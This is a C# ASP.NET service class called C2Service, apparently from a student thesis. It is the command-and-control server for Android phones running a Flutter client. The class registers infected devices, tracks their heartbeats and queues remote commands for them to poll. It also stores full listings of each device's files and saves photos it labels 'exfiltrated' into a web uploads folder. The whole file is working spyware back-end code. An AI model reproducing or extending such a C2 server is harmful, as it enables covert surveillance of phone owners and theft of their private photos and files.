using Microsoft.EntityFrameworkCore;
using tesis.Data;
using tesis.DTOs;
using tesis.Models;
using Microsoft.AspNetCore.Hosting;

namespace tesis.Services
{
    public class C2Service
    {
        private readonly ApplicationDbContext _context;
        private readonly IWebHostEnvironment _environment; // Para saber dónde guardar las fotos

        public C2Service(ApplicationDbContext context, IWebHostEnvironment environment)
        {
            _context = context;
            _environment = environment;
        }

        // 1. Registrar o Actualizar Dispositivo
        public async Task RegisterDeviceAsync(RegisterDeviceDto dto, string ipAddress)
        {
            var device = await _context.Devices.FindAsync(dto.DeviceId);

            if (device == null)
            {
                device = new Device
                {
                    DeviceId = dto.DeviceId,
                    Model = dto.Model,
                    OsVersion = dto.OsVersion,
                    IpAddress = ipAddress,
                    IsOnline = true,
                    RegisteredAt = DateTime.Now
                };
                _context.Devices.Add(device);
            }
            else
            {
                device.IsOnline = true;
                device.LastSeen = DateTime.Now;
                device.IpAddress = ipAddress; // Actualizamos IP por si cambió
            }

            await _context.SaveChangesAsync();
        }

        // 2. Procesar Heartbeat (Latido)
        public async Task UpdateHeartbeatAsync(string deviceId)
        {
            var device = await _context.Devices.FindAsync(deviceId);
            if (device != null)
            {
                device.LastSeen = DateTime.Now;
                device.IsOnline = true;
                await _context.SaveChangesAsync();
            }
        }

        // 3. Obtener Comandos Pendientes (Polling)
        public async Task<List<object>> GetPendingCommandsAsync(string deviceId)
        {
            var commands = await _context.CommandQueue
                .Where(c => c.DeviceId == deviceId && c.Status == "PENDING")
                .ToListAsync();

            // Marcamos como "ENVIADO" o "EXECUTED" para que no se ejecute 2 veces
            foreach (var cmd in commands)
            {
                cmd.Status = "EXECUTED"; // O "SENT" si prefieres confirmar después
                cmd.ExecutedAt = DateTime.Now;
            }
            await _context.SaveChangesAsync();

            // Retornamos solo lo necesario para el JSON
            return commands.Select(c => new
            {
                command = c.CommandType,
                id = c.Id
            }).Cast<object>().ToList();
        }
        // 5. Encolar una Orden (Admin -> Base de Datos)
        public async Task<bool> QueueCommandAsync(string deviceId, string commandType)
        {
            // Verificar si el dispositivo existe
            var device = await _context.Devices.FindAsync(deviceId);
            if (device == null) return false;

            // Crear la orden
            var cmd = new CommandQueue
            {
                DeviceId = deviceId,
                CommandType = commandType,
                Status = "PENDING", // Importante: Pendiente para que Flutter la recoja
                CreatedAt = DateTime.Now
            };

            _context.CommandQueue.Add(cmd);
            await _context.SaveChangesAsync();
            return true;
        }
        // --- PEGAR ESTO DENTRO DE C2SERVICE.CS ---
        public async Task<List<DeviceFile>> GetFilesByDeviceAsync(string deviceId)
        {
            // Consultamos la tabla device_files filtrando por el ID del Huawei
            return await _context.DeviceFiles
                .Where(f => f.DeviceId == deviceId)
                .OrderByDescending(f => f.FileType) // Primero carpetas, luego archivos
                .ThenBy(f => f.Name)
                .ToListAsync();
        }
        public async Task<bool> UpdateDeviceFileMapAsync(FileListDto dto)
        {
            // 1. Verificar si el dispositivo existe (ej: HUAWEIABR-L29)
            // Usamos dto.deviceId (que viene de Flutter) contra d.DeviceId (modelo C#)
            var deviceExists = await _context.Devices.AnyAsync(d => d.DeviceId == dto.deviceId);

            if (!deviceExists) return false;

            // 2. Limpiar lista anterior para evitar duplicados
            var oldFiles = _context.DeviceFiles.Where(f => f.DeviceId == dto.deviceId);
            _context.DeviceFiles.RemoveRange(oldFiles);

            // 3. Insertar los archivos detectados (los 1075 encontrados)
            foreach (var item in dto.files)
            {
                _context.DeviceFiles.Add(new DeviceFile
                {
                    DeviceId = dto.deviceId,
                    Name = item.name,
                    FilePath = item.path,
                    FileType = item.type,
                    FileSize = item.size
                });
            }

            await _context.SaveChangesAsync();
            return true;
        }
        public List<Device> GetAllDevices()
        {
            // Esto va a la base de datos y trae todos los celulares registrados
            return _context.Devices.ToList();
        }
        // =========================================================
        // NUEVO MÉTODO IMPORTANTE PARA LA GALERÍA
        // =========================================================
        public async Task<List<ExfiltratedPhoto>> GetExfiltratedPhotosAsync(string deviceId)
        {
            // Consultamos la tabla correcta: ExfiltratedPhotos
            return await _context.ExfiltratedPhotos
                .Where(p => p.DeviceId == deviceId)
                .OrderByDescending(p => p.CapturedAt) // Las más nuevas primero
                .ToListAsync();
        }
        // 4. Guardar Foto Exfiltrada (La parte crítica)
        public async Task<bool> SaveExfiltratedPhotoAsync(string deviceId, IFormFile file)
        {
            if (file == null || file.Length == 0) return false;

            // Asegurar que existe el dispositivo
            var device = await _context.Devices.FindAsync(deviceId);
            if (device == null) return false; // No aceptamos fotos de extraños

            // Crear carpeta wwwroot/uploads si no existe
            var uploadPath = Path.Combine(_environment.WebRootPath, "uploads");
            if (!Directory.Exists(uploadPath)) Directory.CreateDirectory(uploadPath);

            // Nombre único: ID_FECHA.jpg
            var fileName = $"{deviceId}_{DateTime.Now.Ticks}{Path.GetExtension(file.FileName)}";
            var fullPath = Path.Combine(uploadPath, fileName);

            // Guardar en Disco
            using (var stream = new FileStream(fullPath, FileMode.Create))
            {
                await file.CopyToAsync(stream);
            }

            // Guardar registro en BD
            var photoLog = new ExfiltratedPhoto
            {
                DeviceId = deviceId,
                FilePath = $"/uploads/{fileName}", // Ruta relativa para Angular
                OriginalName = file.FileName,
                CapturedAt = DateTime.Now
            };

            _context.ExfiltratedPhotos.Add(photoLog);
            await _context.SaveChangesAsync();

            return true;
        }
    }
}